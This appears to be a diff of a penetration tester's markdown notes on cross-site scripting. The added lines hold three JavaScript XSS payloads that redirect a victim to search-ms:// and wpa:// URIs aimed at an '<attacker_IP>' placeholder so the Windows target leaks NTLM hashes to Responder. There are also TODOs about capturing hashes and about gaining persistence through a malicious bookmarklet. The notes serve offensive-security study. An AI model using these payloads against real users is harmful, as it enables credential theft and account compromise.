@@ -37,11 +37,23 @@ document.cookie = "<cookie_session>"
 
 TODO: refer to the link to use responder to grab ntlm hashes on a windows target
 
+```javascript
+<script>window.location.href = "search-ms://query=<anything>&subquery=\\\\<attacker_IP>\\<anything>.search-ms"</script>
+
+<script>window.location.href = "search-ms://query=<anything>&crumb=location:\\\\<attacker_IP>\\<anything>"</script>
+
+<script>window.location.href = "wpa:////<attacker_IP>/<anything>"</script>
+```
+
 TODO: Convince the user to click a link or button to add a bookmark using bookmarklet via XSS for persistence
 
 ---
 ## References
 
+- [[03 - Phishing|Responder: Phishing Scenario]]
+
 - [Computer Security Student (CSS): Reflected Cross Site Scripting Injection #1, Man-In-The-Middle Attack](http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson13/index.html)
 
-- [Getting Creds via NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)
+- [Abricto Security: XSS to NTLM Leak using MSQuery](https://abrictosecurity.com/from-cross-site-scripting-to-ntlm-leak-using-msquery/)
+
+- [0xdf: Getting Creds via NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)
